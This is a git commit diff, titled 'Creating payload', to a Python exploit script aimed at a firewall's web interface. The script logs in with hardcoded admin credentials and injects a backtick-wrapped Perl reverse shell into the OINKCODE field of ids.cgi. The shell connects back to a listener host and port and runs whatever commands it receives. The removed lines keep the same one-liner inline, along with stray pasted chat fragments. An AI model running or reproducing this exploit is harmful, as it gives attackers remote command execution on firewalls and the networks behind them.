8458ab116bbbdcf0b4a4db65be96c3961ce01e76
SharedKernel <sharedkernel@protonmail.com>
2023-08-17 16:07:02 -0300

    Creating payload

--- oinkcode.py
+++ oinkcode.py
@@ -4,25 +4,40 @@ ip = '172.16.1.155'
 user = 'admin'
 password = '1pF1@dm#2020'
 port = 444
+lport = 666
+lhost = '172.16.1.112'
 
 r = requests.get(f'https://{ip}:{port}/cgi-bin/pakfire.cgi', auth=(user, password), verify=False)
 
-def generate(self):
+print("Check: " + r.status_code)
+
+def generate():
         return (
             "use IO;foreach my $key(keys %ENV){" +
-            "if($ENV{$key}=~/(.)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"" +
-            self.lhost +
+            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
+            lhost +
             ":" +
-            str(self.lport) +
-            "");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.)/){system $1;}};"
+            str(lport) +
+            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
         )
 
-payload = "perl -MIO -e '" + generate()+"'" (edited)
-[3:41 PM]
-'OINKCODE':'{}'.format(payload)
+payload = "perl -MIO -e \"{}\"".format(generate())
 
 
-r_exploit = requests.post(f'https://{ip}:{port}/cgi-bin/ids.cgi',auth=(user, password), verify=False,headers={'Referer':f'https://{ip}:{port}/cgi-bin/ids.cgi'}, data = {'ENABLE_SNORT_GREEN':'on','ENABLESNORT':'on','RULES':'registered','OINKCODE':'`perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"172.20.1.112:666");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($=~ /(.)/){system $1;}};'`','ACTION':'Download new ruleset','ACTION2':'snort'} )
+r_exploit = requests.post(
+    f'https://{ip}:{port}/cgi-bin/ids.cgi',
+    auth=(user, password),
+    verify=False,
+    headers={'Referer':f'https://{ip}:{port}/cgi-bin/ids.cgi'},
+    data = {
+        'ENABLE_SNORT_GREEN':'on',
+        'ENABLESNORT':'on',
+        'RULES':'registered',
+        'OINKCODE':"`{}`".format(payload),
+        'ACTION':'Download new ruleset',
+        'ACTION2':'snort'
+        }
+    )
 
-#print(r.status_code)
+
 print(r_exploit)
